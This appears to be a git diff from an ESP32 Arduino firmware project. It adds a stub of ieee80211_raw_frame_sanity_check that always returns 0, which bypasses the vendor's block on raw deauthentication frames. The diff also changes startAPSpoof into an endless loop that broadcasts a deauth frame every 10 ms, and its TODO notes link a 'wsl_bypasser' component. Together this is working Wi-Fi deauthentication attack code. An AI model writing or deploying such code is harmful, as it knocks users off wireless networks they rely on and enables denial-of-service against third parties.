@@ -23,6 +23,10 @@
     TODO:
     espressifs function does not support transmitting deauth frames, going to try manual sockets
     https://stackoverflow.com/questions/21411851/how-to-send-data-over-a-raw-ethernet-socket-using-sendto-without-using-sockaddr
+    https://www.man7.org/linux/man-pages/man7/ip.7.html
+
+    Port to esp-idf to use wsl bypasser and enabel deauth frames
+    https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser
 */
 
 //configure AP
@@ -432,25 +436,29 @@ void selectAllDeauthClients() {
 }
 
 
+int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
+    return 0;
+}
+
+
 void startAPSpoof() {
     esp_wifi_start();
 
     const void *buffer = &rawDeauthFrame;
-    int bufferSize = sizeof(rawDeauthFrame)/sizeof(rawDeauthFrame[0]);
+    int bufferSize = sizeof(rawDeauthFrame);
     //sockaddr socketaddress;
     //socketaddress.sa_family = AF_PACKET;
     //socketaddress.sa_data = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
     //uint8_t testMac[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
     //memcpy(socketaddress.sa_data, testMac, sizeof(testMac));
-    esp_vfs_l2tap_intf_register(NULL);
 
-    //int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+    //int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     //int bufferLen = sizeof(rawDeauthFrame);
 
     Serial.println("Startung deauth test");
     while(true) {
-        //esp_wifi_80211_tx(WIFI_IF_AP, buffer, bufferLen, false);
-        sendto(sockfd, buffer, bufferSize, 0, (struct sockaddr*)&socketaddress, sizeof(socketaddress));
+        esp_wifi_80211_tx(WIFI_IF_AP, buffer, bufferSize, false);
+        //sendto(sockfd, buffer, bufferSize, 0, (struct sockaddr*)&socketaddress, sizeof(socketaddress));
         delay(10);
     }
 }
@@ -482,7 +490,6 @@ void setup()
     }
     Serial.println("Starting bluetooth");
     setupBLE(bleTerm);
-    //int socketTest = socket(AF_INET, RAW_SOCKET, sefsef);
     ////bleTerm.begin();
 
     //Setup serial webpage
